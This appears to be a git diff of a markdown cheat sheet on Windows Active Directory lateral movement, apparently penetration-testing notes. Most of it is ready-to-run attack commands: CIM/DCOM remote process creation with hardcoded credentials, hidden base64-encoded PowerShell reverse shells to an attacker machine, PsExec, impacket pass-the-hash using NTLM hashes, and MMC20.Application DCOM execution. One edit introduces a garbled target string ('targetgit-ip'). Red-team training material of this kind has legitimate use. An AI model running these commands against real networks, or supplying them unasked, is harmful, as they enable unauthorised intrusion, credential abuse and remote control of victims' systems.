@@ -22,18 +22,13 @@ Scenario:
 
 Attacker
 
-
 ```powershell
-$username = 'user';
-$password = 'password!';
-$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
-$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+.\tools\CimExec.ps1 -Rhost 10.0.10.30 -User 'user' -Pass 'password!' -Run 'notepad.exe'
+.\tools\CimExec.ps1 -Rhost 10.0.10.30 -User 'user' -Pass 'password!' -Run 'powershell -nop -w hidden -e JABjAGwAaQBl...'
 
-# Start remote process via Cim session using DCOM
-$command = 'notepad';
-$options = New-CimSessionOption -Protocol DCOM
-$session = New-Cimsession -ComputerName 10.0.10.30 -Credential $credential -SessionOption $Options 
-Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+ProcessId ReturnValue PSComputerName
+--------- ----------- --------------
+     3432           0 10.0.10.30
 ```
 
 PS reverse shell as command
@@ -48,9 +43,12 @@ python3 tools/ps-encode.py -s powershell-reverse-shell.ps1
 ```
 
 ```powershell
-
-# Start PS reverse shell via Cim session
-$payload = '';
+# Start PS reverse shell via Cim Session
+$username = 'user';
+$password = 'password!';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+$payload = 'powershell -nop -w hidden -e JABjAGwAaQBl...';
 $options = New-CimSessionOption -Protocol DCOM
 $session = New-Cimsession -ComputerName 10.0.10.30 -Credential $credential -SessionOption $Options 
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$payload};
@@ -127,8 +125,8 @@ Attacker
 * -s NT authority
 
 ```powershell
-
-.\PsExec64.exe -i  \\WEB01 -u example.com\user -p password! powershell
+# Use Hostname 
+.\PsExec64.exe -i  \\WEB01 -u example.com\user -p 'password!' powershell
 ```
 
 ## AD Movement with Pass-the-Hash (PtH)
@@ -148,11 +146,9 @@ Scenario
 * Requires: **ADMIN$ share** available and **File & Printer Sharing** active (default on Windows Server)
 * Limitation: **NTLM authentication** only, Kerberos is not supported
 
-
 ```shell
 /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@10.1.2.3
-/usr/bin/impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@10.1.2.3
-
+/usr/bin/impacket-psexec -hashes :7a38310ea6f0027ee955abed1762964b Administrator@10.1.2.3
 ```
 
 ## AD Movement with NTLM over pass-the-hash (oPtH) to create Kerberos TGTs
@@ -249,11 +245,9 @@ Attacker
 
 ```powershell
 # Run program with MMC20.Application DCOM ojbect
-$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","target-ip"))
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","targetgit-ip"))
 $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c notepad","7");
 
 # Run PS reserse shell to connect to attacker kali machine
 $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD...","7")
 ```
-
-## Active Directory Persistence
